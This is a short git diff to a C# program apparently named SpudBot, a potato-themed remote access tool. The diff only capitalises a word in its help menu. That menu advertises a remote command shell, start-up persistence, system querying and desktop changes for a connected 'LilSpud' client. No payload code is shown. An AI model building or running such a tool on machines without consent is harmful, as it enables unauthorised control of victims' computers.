@@ -20,7 +20,7 @@ namespace SpudBot
                 SpudCommand.StartInfo.UseShellExecute = false;
                 SpudCommand.StartInfo.RedirectStandardOutput = true;
 
-                string help = "\n\n - help                Print out a list of commands.\n - calc                Count Potatoes with Calculator.\n - desktop             Spudify the Desktop Background.\n - download            Download LilSpud's favorite poem.\n - fact                Send LilSpud a random Spudfact.\n - music               Play LilSpud's favorite song.\n - search              Find Potatoes Near LilSpud.\n - shell               Establish a Command Shell with LilSpud.\n - startup             Launch SpudNet on start-up.\n - status              Report the status of LilSpud.\n - whoami              Query System Information.\n - exit                Terminate the Current Session.\n";
+                string help = "\n\n - help                Print out a list of commands.\n - calc                Count Potatoes with Calculator.\n - desktop             Spudify the Desktop Background.\n - download            Download LilSpud's favorite Poem.\n - fact                Send LilSpud a random Spudfact.\n - music               Play LilSpud's favorite song.\n - search              Find Potatoes Near LilSpud.\n - shell               Establish a Command Shell with LilSpud.\n - startup             Launch SpudNet on start-up.\n - status              Report the status of LilSpud.\n - whoami              Query System Information.\n - exit                Terminate the Current Session.\n";
 
                 Byte[] data = System.Text.Encoding.ASCII.GetBytes(FiggleFonts.Standard.Render("Spudnet") + "\nA LilSpud has connected ... \nInteract with LilSpud using the following Commands:" + help);
 
